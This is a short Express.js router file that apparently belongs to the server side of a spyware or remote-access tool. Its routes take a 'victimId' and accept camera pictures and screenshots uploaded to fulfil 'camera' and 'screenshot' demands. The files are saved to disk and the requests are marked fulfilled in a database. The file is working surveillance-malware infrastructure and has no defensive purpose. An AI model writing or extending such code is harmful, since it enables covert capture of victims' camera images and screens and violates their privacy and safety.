import { Router } from "express";
import Request from '../models/requestModel.js';
import multer from 'multer';

const router = Router();
let storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, './uploads')
    },
    filename: function (req, file, cb) {
      let extArray = file.mimetype.split("/");
      let extension = extArray[extArray.length - 1];
      cb(null, file.fieldname + '-' + Date.now()+ '.' +extension)
    }
  })
const upload = multer({ storage: storage })

/**
 * Handle camera picture upload
 * @route POST /api/fulfill/cameraPicture/:victimId
 */
router.post('/camera/:victimId', upload.single('img'), async (req, res, next) => {
    try {
        const updatedRequest = await Request.findOneAndUpdate(
            { victimId: req.params.victimId, _id: req.body.requestId, demand: 'camera' },
            { fulfilled: true, fulfilledAt: req.file.destination + '/' + req.file.filename },
            { new: true }
        );
        res.json(updatedRequest);
    } catch (err) {
        next(err);
    }
});

/**
 * Handle screenshot upload
 * @route POST /api/fulfill/screenshot/:victimId
 */
router.post('/screenshot/:victimId', upload.single('img'), async (req, res, next) => {
    try {
        const updatedRequest = await Request.findOneAndUpdate(
            { victimId: req.params.victimId, _id: req.body.requestId, demand: 'screenshot' },
            { fulfilled: true, fulfilledAt: req.file.destination + '/' + req.file.filename },
            { new: true }
        );
        res.json(updatedRequest);
    } catch (err) {
        next(err);
    }
});


/**
 * Health check for fulfillment route
 * @route GET /api/fulfill/health
 */
router.get('/health', (req, res) => {
    res.send('Fulfillment route OK');
});

export default router;

